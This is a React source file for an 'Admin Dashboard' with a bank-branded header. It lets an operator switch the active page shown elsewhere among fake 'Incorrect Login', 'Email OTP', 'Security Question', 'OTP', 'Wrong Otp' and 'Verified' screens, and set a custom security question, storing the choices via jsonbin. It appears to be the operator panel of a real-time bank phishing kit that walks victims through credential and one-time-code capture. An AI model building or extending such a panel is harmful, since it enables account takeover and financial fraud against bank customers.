import { useState } from "react";
import { updateSettings } from "../pages/jsonbin";
import BankHeader from "../components/bankhead";

export default function Admin() {
  const [activePage, setActivePage] = useState("landing");
  const [question, setQuestion] = useState("");
  const [showPopup, setShowPopup] = useState(false);

  const save = async () => {
    try {
      await updateSettings({
        activePage: activePage as any,
        securityQuestion: question,
      });

      setShowPopup(true);

      // Hide popup after 3 seconds
      setTimeout(() => {
        setShowPopup(false);
      }, 3000);
    } catch (err) {
      console.error(err);
    }
  };

  return (
    <>
    <BankHeader/>
      <div className="max-w-2xl mx-auto mt-20">
        <h1 className="text-4xl font-bold mb-10">
          Admin Dashboard
        </h1>

        <label>Active Page</label>

        <select
          className="border w-full p-4 mt-2"
          value={activePage}
          onChange={(e) => setActivePage(e.target.value)}
        >
          <option value="landing">Landing</option>
          <option value="email">Incorrect Login</option>
          <option value="code">Email OTP</option>
          <option value="security">Security Question</option>
          <option value="otp">OTP</option>
          <option value="otp2">Wrong Otp</option>

          <option value="verified">Verified</option>
        </select>

        <label className="block mt-8">
          Security Question
        </label>

        <input
          className="border w-full p-4 mt-2"
          value={question}
          onChange={(e) => setQuestion(e.target.value)}
        />

        <button
          onClick={save}
          className="mt-8 bg-black text-white px-8 py-4 rounded hover:bg-gray-800 transition"
        >
          Save Changes
        </button>
      </div>

      {/* Success Popup */}
      {showPopup && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-white rounded-xl p-8 w-[380px] text-center shadow-xl animate-scale">
            <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center mx-auto">
              <svg
                className="w-10 h-10 text-green-600"
                fill="none"
                stroke="currentColor"
                strokeWidth="3"
                viewBox="0 0 24 24"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M5 13l4 4L19 7"
                />
              </svg>
            </div>

            <h2 className="text-2xl font-bold mt-5">
              Success!
            </h2>

            <p className="text-gray-600 mt-2">
              Page has been changed successfully.
            </p>

            <button
              onClick={() => setShowPopup(false)}
              className="mt-6 bg-green-600 text-white px-6 py-3 rounded-lg hover:bg-green-700"
            >
              OK
            </button>
          </div>
        </div>
      )}
    </>
  );
}